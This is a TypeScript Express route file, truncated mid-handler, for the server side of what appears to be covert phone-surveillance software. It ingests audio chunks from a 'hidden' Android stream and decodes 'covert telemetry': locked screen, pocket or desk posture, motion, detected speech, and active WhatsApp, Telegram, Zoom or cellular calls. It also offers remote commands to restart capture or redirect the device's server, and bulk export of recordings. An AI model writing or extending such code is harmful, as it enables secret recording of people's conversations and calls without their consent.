/**
 * broadcast.ts — API routes for broadcaster clients.
 *
 * Handles session lifecycle and chunk ingestion:
 *   POST /api/v1/broadcasts              — Create new session
 *   POST /api/v1/broadcasts/:id/chunk    — Upload an audio chunk
 *   PUT  /api/v1/broadcasts/:id/end      — End a session
 *   GET  /api/v1/broadcasts/:id          — Get session info
 */

import { Router, Request, Response } from 'express';
import multer from 'multer';
import rateLimit from 'express-rate-limit';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs';
import path from 'path';
import archiver from 'archiver';
import AdmZip from 'adm-zip';
import * as db from '../database';
import * as storage from '../storage';
import { appendToHLS, finalizeHLS, hasActiveHlsListener } from '../hls';
import { sendDeviceCommand, broadcastLiveEvent } from '../websocket';
import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';

const router = Router();
const exportRateLimit = rateLimit({
    windowMs: 60 * 1000,
    max: 15,
    standardHeaders: true,
    legacyHeaders: false,
    message: {
        status: 'error',
        message: 'Too many export requests. Please retry after a minute.',
    },
});

// Multer: store uploaded chunks in memory (they're small — max 5MB)
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: MAX_UPLOAD_SIZE },
});

// ════════════════════════════════════════════════════════════════════════════
// CREATE SESSION
// ════════════════════════════════════════════════════════════════════════════

router.post('/', (req: Request, res: Response) => {
    try {
        const sessionId = req.body?.session_id || uuidv4();
        const { client_name, device_info, title, stream_type } = req.body || {};
        const streamType = stream_type === 'main' ? 'main' : 'hidden';

        // Create storage directories
        storage.createSessionDirs(sessionId);

        // Create database record
        const session = db.createSession(
            sessionId,
            client_name || '',
            device_info || '',
            title || '',
            streamType
        );

        console.log(`[broadcast] New session: ${sessionId} (client: ${client_name || 'unknown'}, type: ${streamType})`);

        res.status(201).json({
            status: 'created',
            session_id: sessionId,
            session,
        });
    } catch (err: any) {
        console.error('[broadcast] Create session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// UPLOAD CHUNK
// ════════════════════════════════════════════════════════════════════════════

router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const file = req.file;

        if (!file) {
            res.status(400).json({ status: 'error', message: 'No audio file provided' });
            return;
        }

        // Verify session exists or auto-recover if missing (e.g. after server restart)
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name)
                || (db.getAllDeviceCommands()[0]?.client_id)
                || 'Realme-RMX2040';
            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
            session = db.createSession(
                session_id,
                clientName,
                'Android Device (Live)',
                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
                streamType
            );
            console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName}, type: ${streamType})`);
        } else if (session.status !== 'live') {
            db.reactivateSession(session_id);
            console.log(`[broadcast] Reactivated ended session to live on chunk ingest: ${session_id}`);
        }

        // Parse optional metadata from request body
        const chunkId = req.body.chunk_id || uuidv4();
        const durationMs = parseInt(req.body.duration_ms || String(CHUNK_DURATION_MS), 10);
        const checksum = req.body.checksum || '';
        const inCall = req.body.in_call === '1' || req.body.in_call === 'true' ? 1 : 0;
        const micInUse = req.body.mic_in_use === '1' || req.body.mic_in_use === 'true' ? 1 : 0;
        const clientTimestamp = req.body.timestamp;

        // Duplicate detection by chunk_id: if chunk was already uploaded, return 'already_exists' immediately
        if (req.body.chunk_id) {
            const existingChunk = db.getChunk(chunkId);
            if (existingChunk) {
                console.log(`[broadcast] Duplicate chunk skipped (chunk_id exists): session=${existingChunk.session_id} seq=${existingChunk.sequence_num} chunk_id=${chunkId}`);
                res.json({
                    status: 'already_exists',
                    session_id: existingChunk.session_id,
                    chunk_id: existingChunk.chunk_id,
                    sequence_num: existingChunk.sequence_num,
                    file_size: existingChunk.file_size,
                    message: 'Chunk already uploaded.',
                });
                return;
            }
        }

        // Get sequence number from body or auto-increment
        let sequenceNum: number;
        if (req.body.sequence_num !== undefined) {
            sequenceNum = parseInt(req.body.sequence_num, 10);
        } else {
            sequenceNum = db.getLatestChunkSequence(session_id) + 1;
        }

        // Duplicate detection: if this sequence already uploaded, skip
        if (db.chunkExists(session_id, sequenceNum)) {
            console.log(`[broadcast] Duplicate chunk skipped (seq exists): session=${session_id} seq=${sequenceNum}`);
            res.json({
                status: 'already_exists',
                session_id,
                chunk_id: chunkId,
                sequence_num: sequenceNum,
                message: 'Chunk already uploaded.',
            });
            return;
        }

        // Save chunk to disk
        const saved = storage.saveChunk(session_id, sequenceNum, file.buffer, file.originalname);

        // Insert into database (with race-condition / conflict safety)
        let chunk: db.Chunk;
        try {
            chunk = db.insertChunk(
                chunkId,
                session_id,
                sequenceNum,
                saved.filename,
                saved.filepath,
                saved.fileSize,
                durationMs,
                checksum,
                inCall,
                micInUse
            );
        } catch (dbErr: any) {
            if (dbErr.code === 'SQLITE_CONSTRAINT_UNIQUE' || (dbErr.message && dbErr.message.includes('UNIQUE constraint failed'))) {
                console.warn(`[broadcast] Unique constraint conflict on chunk insert handled gracefully (session=${session_id}, seq=${sequenceNum}, chunkId=${chunkId}): ${dbErr.message}`);
                const existing = db.getChunk(chunkId) || (db.chunkExists(session_id, sequenceNum) ? db.getSessionChunks(session_id).find(c => c.sequence_num === sequenceNum) : undefined);
                res.json({
                    status: 'already_exists',
                    session_id: existing?.session_id || session_id,
                    chunk_id: existing?.chunk_id || chunkId,
                    sequence_num: existing?.sequence_num || sequenceNum,
                    file_size: existing?.file_size || saved.fileSize,
                    message: 'Chunk already uploaded.',
                });
                return;
            }
            throw dbErr;
        }

        // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?(?:_SIL([01]))?/);
        if (metaMatch) {
            const battery = metaMatch[1];
            const routeCode = metaMatch[3];
            const screenCode = metaMatch[4];
            const unlockCode = metaMatch[5];
            const powerCode = metaMatch[6];
            const ringerCode = metaMatch[7];
            const speechCode = metaMatch[8];
            const dbVal = metaMatch[9];
            const tempVal = metaMatch[10];
            const motionCode = metaMatch[11];
            const postureCode = metaMatch[12];
            const appCode = metaMatch[13];
            const silCode = metaMatch[14];

            const session = db.getSession(session_id);
            if (session) {
                const baseInfo = session.device_info.split('|')[0].trim();

                // Only show covert intelligence details if this is the covert "hidden" stream!
                // Main stream sessions remain completely clean and basic.
                if (session.stream_type === 'hidden') {
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';

                    let powerStr = '';
                    if (powerCode === 'CUSB') powerStr = ' (💻 PC USB)';
                    else if (powerCode === 'CAC') powerStr = ' (⚡ Wall AC)';
                    else if (powerCode === 'CWIR') powerStr = ' (🛜 Wireless)';

                    let screenStr = '';
                    if (screenCode === '1') {
                        screenStr = unlockCode === '1' ? ' | 📱 Screen ON (Unlocked)' : ' | 📱 Screen ON (Locked)';
                    } else if (screenCode === '0') {
                        screenStr = ' | 🌑 Screen OFF';
                    }

                    let ringerStr = '';
                    if (ringerCode === 'RS') ringerStr = ' | 🔇 Silent';
                    else if (ringerCode === 'RV') ringerStr = ' | 📳 Vibrate';

                    let audioStr = '';
                    if (speechCode === '1') {
                        audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
                    } else if (silCode === '1') {
                        audioStr = ` | 🤫 Silent (${dbVal || 0}dB)`;
                    }

                    let tempStr = tempVal && parseInt(tempVal) > 0 ? ` | 🌡️ ${tempVal}°C` : '';
                    let motionStr = motionCode === '1' ? ' | 🏃 Moving' : (motionCode === '0' ? ' | 🪑 Still' : '');
                    let postureStr = postureCode === 'POCK' ? ' | 👖 Pocket' : (postureCode === 'DESK' ? ' | 🪵 Desk' : (postureCode === 'OPEN' ? ' | ✋ Hand' : ''));

                    let appStr = '';
                    if (appCode && appCode !== 'AIDLE') {
                        if (appCode === 'AWA') appStr = ' | 🟢 WhatsApp Call';
                        else if (appCode === 'AIG') appStr = ' | 🟣 Instagram Call';
                        else if (appCode === 'ATG') appStr = ' | 🔵 Telegram Call';
                        else if (appCode === 'AZOOM') appStr = ' | 💻 Zoom Call';
                        else if (appCode === 'AMEET') appStr = ' | 📹 Google Meet';
                        else if (appCode === 'ACELL') appStr = ' | 📞 Cellular Call';
                        else if (appCode === 'AMIC') appStr = ' | 🎙️ External Mic App';
                        else appStr = ` | 📞 Call (${appCode.replace(/^A/, '')})`;
                    }

                    let mnStr = '';
                    const mnMatch = file.originalname.match(/_MN([01])/);
                    if (mnMatch && mnMatch[1] === '1') {
                        mnStr = ' | 🔴 Main UI Active';
                    }

                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}${mnStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                } else {
                    // Standard / Main stream — keep simple
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';
                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${routeStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                }
            }
        }

        console.log(`[broadcast] Chunk saved: session=${session_id} seq=${sequenceNum} call=${inCall} micUse=${micInUse}`);

        // On-demand HLS: only run FFmpeg if an active listener is streaming
        if (hasActiveHlsListener(session_id)) {
            appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
                console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
            });
        }

        res.json({
            status: 'confirmed',
            session_id,
            chunk_id: chunkId,
            sequence_num: sequenceNum,
            file_size: saved.fileSize,
            message: 'Chunk uploaded successfully. You may delete the local copy.',
        });
    } catch (err: any) {
        if (err.code === 'SQLITE_CONSTRAINT_UNIQUE' || (err.message && err.message.includes('UNIQUE constraint failed'))) {
            console.warn(`[broadcast] Outer caught unique constraint: ${err.message}. Returning already_exists (HTTP 200).`);
            res.status(200).json({
                status: 'already_exists',
                session_id: req.params.session_id,
                chunk_id: req.body?.chunk_id,
                message: 'Chunk already uploaded.',
            });
            return;
        }
        console.error('[broadcast] Upload chunk error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

/**
 * POST /api/v1/broadcasts/:session_id/upload-zip
 * Batch upload of offline audio chunks packaged as a single ZIP archive.
 */
router.post('/:session_id/upload-zip', upload.single('file'), async (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const file = req.file;

        if (!file) {
            res.status(400).json({ status: 'error', message: 'No zip file provided' });
            return;
        }

        // Verify session exists or auto-recover if missing
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name)
                || (db.getAllDeviceCommands()[0]?.client_id)
                || 'Realme-RMX2040';
            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
            session = db.createSession(
                session_id,
                clientName,
                'Android Device (Live)',
                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
                streamType
            );
            console.log(`[broadcast] Auto-recovered session for batch zip: ${session_id}`);
        } else if (session.status !== 'live') {
            db.reactivateSession(session_id);
        }

        const zip = new AdmZip(file.buffer);
        const batchChunks: db.BatchChunkInput[] = [];
        let currentMaxSeq = db.getLatestChunkSequence(session_id);

        function processZipEntries(entries: AdmZip.IZipEntry[]) {
            for (const entry of entries) {
                if (entry.isDirectory) continue;
                const basename = path.basename(entry.entryName);
                if (basename.startsWith('.') || basename.startsWith('__MACOSX')) continue;

                // Handle nested ZIP files (e.g. Master ZIP containing sub-ZIP bundles)
                if (basename.toLowerCase().endsWith('.zip')) {
                    try {
                        const nestedZip = new AdmZip(entry.getData());
                        processZipEntries(nestedZip.getEntries());
                    } catch (nestedErr: any) {
                        console.error(`[broadcast] Failed to process nested zip ${basename}:`, nestedErr.message);
                    }
                    continue;
                }

                const buffer = entry.getData();
                if (buffer.length === 0) continue;

                currentMaxSeq++;
                const sequenceNum = currentMaxSeq;

                const saved = storage.saveChunk(session_id, sequenceNum, buffer, basename);

                const chunkIdMatch = basename.match(/^([a-f0-9-]{36})/i);
                const chunkId = chunkIdMatch ? chunkIdMatch[1] : uuidv4();

                const inCall = basename.includes('_C1') || basename.includes('ACELL') || basename.includes('AWA') ? 1 : 0;
                const micInUse = basename.includes('_U1') ? 1 : 0;

                batchChunks.push({
                    chunkId,
                    sequenceNum,
                    filename: saved.filename,
                    filepath: saved.filepath,
                    fileSize: saved.fileSize,
                    durationMs: CHUNK_DURATION_MS,
                    inCall,
                    micInUse
                });
            }
        }

        processZipEntries(zip.getEntries());

        const { insertedCount } = db.insertChunksBatch(session_id, batchChunks);

        console.log(`[broadcast] Batch ZIP processed: session=${session_id}, extracted=${batchChunks.length}, inserted=${insertedCount}`);

        res.json({
            status: 'confirmed',
            session_id,
            chunks_processed: batchChunks.length,
            chunks_inserted: insertedCount,
            message: 'Batch chunks imported successfully.'
        });
    } catch (err: any) {
        console.error('[broadcast] Batch ZIP upload error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// BATCH MULTI-SESSION ZIP EXPORT (Pro Download with Chunks & Full Telemetry)
// ════════════════════════════════════════════════════════════════════════════

interface DecodedTelemetry {
    sequenceNum: number;
    filename: string;
    fileSize: number;
    durationMs: number;
    batteryPercent: number | null;
    powerSource: string;
    screenState: string;
    screenUnlocked: boolean | null;
    audioRoute: string;
    ringerMode: string;
    speechDetected: boolean;
    decibels: number | null;
    temperatureC: number | null;
    motion: string;
    posture: string;
    activeApp: string;
    inCall: boolean;
    micInUse: boolean;
    receivedAtIST: string;
    receivedAtUTC: string;
}

function toISTString(isoDate: string): string {
    try {
        const d = new Date(isoDate);
        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
    } catch {
        return isoDate;
    }
}

function parseChunkTelemetry(filename: string, chunk: db.Chunk): DecodedTelemetry {
    const metaMatch = filename.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);

    let batteryPercent: number | null = null;
    let powerSource = 'Battery (Unplugged)';
    let screenState = 'Unknown';
    let screenUnlocked: boolean | null = null;
    let audioRoute = 'Internal Mic';
    let ringerMode = 'Normal';
    let speechDetected = false;
    let decibels: number | null = null;
    let temperatureC: number | null = null;
    let motion = 'Still';
    let posture = 'Normal';
    let activeApp = 'None';

    if (metaMatch) {
        if (metaMatch[1] && metaMatch[1] !== '-1') {
            batteryPercent = parseInt(metaMatch[1], 10);
        }
        const routeCode = metaMatch[3];
        if (routeCode === 'JCK') audioRoute = 'Headphone Jack';
        else if (routeCode === 'BLU') audioRoute = 'Bluetooth Audio';
        else if (routeCode === 'SPK') audioRoute = 'Speakerphone';

        const screenCode = metaMatch[4];
        const unlockCode = metaMatch[5];
        if (screenCode === '1') {
            screenState = unlockCode === '1' ? 'Screen ON (Unlocked)' : 'Screen ON (Locked)';
            screenUnlocked = unlockCode === '1';
        } else if (screenCode === '0') {
            screenState = 'Screen OFF';
            screenUnlocked = false;
        }

        const powerCode = metaMatch[6];
        if (powerCode === 'CAC') powerSource = 'Wall AC Fast Charger';
        else if (powerCode === 'CUSB') powerSource = 'PC / USB Cable';
        else if (powerCode === 'CWIR') powerSource = 'Wireless Charging';
        else if (powerCode === 'CBAT') powerSource = 'Battery (Unplugged)';

        const ringerCode = metaMatch[7];
        if (ringerCode === 'RS') ringerMode = 'Silent';
        else if (ringerCode === 'RV') ringerMode = 'Vibrate';
        else if (ringerCode === 'RN') ringerMode = 'Normal';

        speechDetected = metaMatch[8] === '1';
        if (metaMatch[9]) decibels = parseInt(metaMatch[9], 10);
        if (metaMatch[10] && parseInt(metaMatch[10], 10) > 0) temperatureC = parseInt(metaMatch[10], 10);

        const motionCode = metaMatch[11];
        if (motionCode === '1') motion = 'Moving';
        else if (motionCode === '0') motion = 'Still';

        const postureCode = metaMatch[12];
        if (postureCode === 'POCK') posture = 'In Pocket';
        else if (postureCode === 'DESK') posture = 'On Desk (Flat)';
        else if (postureCode === 'OPEN' || postureCode === 'POPEN') posture = 'In Hand';
        else if (postureCode === 'FACE') posture = 'Face Down';

        if (metaMatch[13]) activeApp = metaMatch[13];
    }

    return {
        sequenceNum: chunk.sequence_num,
        filename: path.basename(chunk.filepath || filename),
        fileSize: chunk.file_size,
        durationMs: chunk.duration_ms,
        batteryPercent,
        powerSource,
        screenState,
        screenUnlocked,
        audioRoute,
        ringerMode,
        speechDetected,
        decibels,
        temperatureC,
        motion,
        posture,
        activeApp,
        inCall: chunk.in_call === 1,
        micInUse: chunk.mic_in_use === 1,
        receivedAtIST: toISTString(chunk.received_at),
        receivedAtUTC: chunk.received_at,
    };
}

router.all('/batch-export-zip', exportRateLimit, async (req: Request, res: Response) => {
    try {
        let sessionIds: string[] = [];
        if (Array.isArray(req.body?.session_ids)) {
            sessionIds = req.body.session_ids.map((id: any) => String(id).trim()).filter(Boolean);
        } else if (typeof req.body?.session_ids === 'string') {
            sessionIds = req.body.session_ids.split(',').map((s: string) => s.trim()).filter(Boolean);
        } else if (req.query?.session_ids || req.query?.ids) {
            const raw = (req.query.session_ids || req.query.ids) as string;
            sessionIds = raw.split(',').map(s => s.trim()).filter(Boolean);
        }

        if (sessionIds.length === 0) {
            res.status(400).json({ status: 'error', message: 'No session_ids provided for batch export' });
            return;
        }

        const formatParam = (req.body?.format || req.query?.format || 'pro_chunks').toLowerCase();
        const timestampStr = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
        const zipFilename = `audio_sessions_batch_${timestampStr}.zip`;

        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename="${zipFilename}"`);

        const archive = archiver('zip', {
            zlib: { level: 6 },
        });

        archive.on('error', (err: any) => {
            console.error('[broadcast] Batch ZIP export error:', err);
            if (!res.headersSent) {
                res.status(500).json({ status: 'error', message: 'Batch export failed' });
            }
        });

        archive.pipe(res);

        for (const sessionId of sessionIds) {
            const session = db.getSession(sessionId);
            if (!session) {
                archive.append(`Session ID: ${sessionId} not found in database.\n`, {
                    name: `missing_sessions/${sessionId}.txt`
                });
                continue;
            }

            const cleanClient = (session.client_name || 'session').replace(/[^a-zA-Z0-9_-]/g, '_');
            const datePrefix = (session.created_at || '').slice(0, 10).replace(/-/g, '');
            const folderName = `${cleanClient}_${datePrefix}_${sessionId.slice(0, 8)}`;

            const chunks = db.getSessionChunks(sessionId);
            const rawDir = storage.getRawDir(sessionId);
            const resolvedRawDir = path.resolve(rawDir);

            const chunkFiles = chunks
                .map(c => path.resolve(c.filepath))
                .filter(filePath =>
                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
                    && fs.existsSync(filePath)
                );

            if (chunkFiles.length === 0) {
                archive.append(`No audio recordings found on disk for session ${sessionId}.\n`, {
                    name: `${folderName}/empty_session.txt`
                });
                continue;
            }

            if (formatParam === 'audio') {
                // Merge all raw chunks into single continuous stream/file
                const buffers: Buffer[] = [];
                for (const fp of chunkFiles) {
                    try {
                        buffers.push(fs.readFileSync(fp));
                    } catch { }
                }
                if (buffers.length > 0) {
                    const mergedBuffer = Buffer.concat(buffers);
                    const ext = path.extname(chunkFiles[0]) || '.aac';
                    archive.append(mergedBuffer, { name: `${folderName}/${cleanClient}_full_audio${ext}` });
                }
            } else {
                // Simple audio chunks directly in the session folder
                for (const filePath of chunkFiles) {
                    archive.file(filePath, { name: `${folderName}/${path.basename(filePath)}` });
                }
            }
        }

        await archive.finalize();
    } catch (err: any) {
        console.error('[broadcast] Batch export error:', err);
        if (!res.headersSent) {
            res.status(500).json({ status: 'error', message: err.message });
        }
    }
});

// ════════════════════════════════════════════════════════════════════════════
// EXPORT AUDIO BY CHANNEL (Mic vs Internal vs Stereo)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const channelParam = (req.query.channel as string || 'both').toLowerCase();
        const session = db.getSession(session_id);

        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        const rawDir = storage.getRawDir(session_id);
        const vodM3u8 = `${storage.getHlsDir(session_id)}/vod.m3u8`;

        if (!require('fs').existsSync(vodM3u8) && !require('fs').existsSync(rawDir)) {
            res.status(404).json({ status: 'error', message: 'No recordings available for this session' });
            return;
        }

        const formatParam = (req.query.format as string || 'aac').toLowerCase();

        if (formatParam === 'zip') {
            const chunks = db.getSessionChunks(session_id);
            if (chunks.length === 0) {
                res.status(404).json({ status: 'error', message: 'No chunks available for this session' });
                return;
            }

            const rawDir = storage.getRawDir(session_id);
            const resolvedRawDir = path.resolve(rawDir);
            const chunkFiles = chunks
                .map(c => path.resolve(c.filepath))
                .filter(filePath =>
                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
                    && fs.existsSync(filePath)
                );

            if (chunkFiles.length === 0) {
                res.status(404).json({ status: 'error', message: 'Chunk files not found on disk' });
                return;
            }

            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_chunks.zip`;
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

            const archive = archiver('zip', {
                zlib: { level: 6 },
            });

            archive.on('error', (err: any) => {
                console.error('[broadcast] ZIP export error:', err);
                if (!res.headersSent) {
                    res.status(500).json({ status: 'error', message: 'ZIP export failed' });
                }
            });

            archive.pipe(res);

            for (const filePath of chunkFiles) {
                archive.file(filePath, { name: path.basename(filePath) });
            }

            archive.finalize();
            return;
        }

        if (formatParam === 'm3u8') {
            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.m3u8`;
            res.setHeader('Content-Type', 'audio/x-mpegurl');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.sendFile(vodM3u8);
            return;
        }

        // Export as single combined audio file using FFmpeg
        const isMP3 = formatParam === 'mp3';
        const ext = isMP3 ? 'mp3' : 'aac';
        const contentType = isMP3 ? 'audio/mpeg' : 'audio/aac';
        const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.${ext}`;

        res.setHeader('Content-Type', contentType);
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

        const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
        const { spawn } = require('child_process');

        const args = ['-i', vodM3u8];
        if (isMP3) {
            args.push('-c:a', 'libmp3lame', '-q:a', '2', '-f', 'mp3');
        } else {
            args.push('-c:a', 'copy', '-f', 'adts'); // fast copy
        }
        args.push('pipe:1');

        const proc = spawn(ffmpegInstaller.path, args);
        proc.stdout.pipe(res);

        proc.on('error', (err: any) => {
            console.error('[broadcast] FFmpeg export error:', err);
            if (!res.headersSent) {
                res.status(500).json({ status: 'error', message: 'Export failed' });
            }
        });

        req.on('close', () => {
            if (!proc.killed) {
                proc.kill();
            }
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// END SESSION
// ════════════════════════════════════════════════════════════════════════════

router.put('/:session_id/end', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;

        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        db.endSession(session_id);
        finalizeHLS(session_id);

        console.log(`[broadcast] Session ended: ${session_id}`);

        res.json({
            status: 'ended',
            session_id,
            message: 'Session ended. VOD playlist finalized.',
        });
    } catch (err: any) {
        console.error('[broadcast] End session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.put('/:session_id/activate', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name) || 'Realme-RMX2040';
            session = db.createSession(session_id, clientName, 'Android Device (Live)', `Live Stream - ${clientName}`);
        } else {
            db.reactivateSession(session_id);
        }
        console.log(`[broadcast] Session activated/resumed as live: ${session_id}`);
        res.json({ status: 'live', session_id, message: 'Session is now live.' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});



// ════════════════════════════════════════════════════════════════════════════
// REMOTE CONTROL COMMANDS
// ════════════════════════════════════════════════════════════════════════════

router.post('/remote-command', (req: Request, res: Response) => {
    try {
        const { client_id, command, payload, enabled, config } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }

        db.setDeviceCommand(client_id, command);
        console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);

        const targetUrl = payload?.server_url || payload?.url || payload?.new_url || config?.server_url || req.body.url || req.body.server_url;
        if (targetUrl && typeof targetUrl === 'string' && (targetUrl.startsWith('http://') || targetUrl.startsWith('https://'))) {
            try {
                db.saveDeviceConfig(client_id, { server_url: targetUrl.trim() });
            } catch (e) {
                console.error('[broadcast] Failed saving updated server_url to device config:', e);
            }
        }

        const extraData: Record<string, any> = {};
        if (payload) Object.assign(extraData, payload);
        if (enabled !== undefined) extraData.enabled = enabled;
        if (config !== undefined) extraData.config = config;
        if (targetUrl) {
            extraData.server_url = targetUrl.trim();
            extraData.url = targetUrl.trim();
        }

        // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
        const pushedViaSocket = sendDeviceCommand(client_id, command, extraData);

        res.json({
            status: 'success',
            client_id,
            command,
            delivered_via_socket: pushedViaSocket,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Trigger remote soft or hard restart
router.post('/restart', (req: Request, res: Response) => {
    try {
        const { client_id, type } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        const cmd = (type === 'app') ? 'RESTART_APP' : 'RESTART_STREAM';
        db.setDeviceCommand(client_id, cmd);
        const pushed = sendDeviceCommand(client_id, cmd);
        console.log(`[broadcast] Restart requested for ${client_id} (${cmd}) - pushed: ${pushed}`);
        res.json({ status: 'success', client_id, command: cmd, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Toggle Eco Low-CPU Mode remotely
router.post('/eco-mode', (req: Request, res: Response) => {
    try {
        const { client_id, enabled } = req.body;
        if (!client_id || enabled === undefined) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or enabled boolean' });
            return;
        }
        const isEnabled = Boolean(enabled);
        const pushed = sendDeviceCommand(client_id, 'SET_ECO_MODE', { enabled: isEnabled });
        console.log(`[broadcast] Eco Mode toggled for ${client_id} to ${isEnabled} - pushed: ${pushed}`);
        res.json({ status: 'success', client_id, enabled: isEnabled, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Save & push remote configuration
router.post('/config', (req: Request, res: Response) => {
    try {
        const { client_id, config } = req.body;
        if (!config) {
            res.status(400).json({ status: 'error', message: 'Missing config' });
            return;
        }
        const targetClientId = client_id || db.getAllDeviceCommands()[0]?.client_id || 'Realme-RMX2040';
        const existingConfig = db.getDeviceConfig(targetClientId) || {};
        const mergedConfig = { ...existingConfig, ...config };
        db.saveDeviceConfig(targetClientId, mergedConfig);

        const pushed = sendDeviceCommand(targetClientId, 'UPDATE_CONFIG', { config: mergedConfig });
        console.log(`[broadcast] Remote config saved & pushed for ${targetClientId} - pushed: ${pushed}`);

        // If chunk duration changed, trigger instant capture re-initialization so it takes effect on the mic immediately
        if (config.chunk_duration_sec) {
            setTimeout(() => {
                sendDeviceCommand(targetClientId, 'RESTART_CAPTURE');
                console.log(`[broadcast] Sent RESTART_CAPTURE to ${targetClientId} for ${config.chunk_duration_sec}s latency update`);
            }, 300);
        }

        broadcastLiveEvent({
            type: 'config_updated',
            client_id: targetClientId,
            config: mergedConfig,
        });

        res.json({ status: 'success', client_id: targetClientId, config: mergedConfig, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Retrieve saved remote configuration
router.get('/config', (req: Request, res: Response) => {
    try {
        const client_id = (req.query.client_id as string) || db.getAllDeviceCommands()[0]?.client_id || 'Realme-RMX2040';
        const config = db.getDeviceConfig(client_id) || { chunk_duration_sec: 2 };
        res.json({ status: 'success', client_id, config });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.get('/command', (req: Request, res: Response) => {
    try {
        const client_id = req.query.client_id as string;
        const status = req.query.status as string; // 'idle' or 'recording'
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        if (status) {
            db.updateDeviceStatus(client_id, status);
        }

        const cmd = db.getDeviceCommand(client_id);
        const commandStr = cmd ? cmd.command : 'NONE';
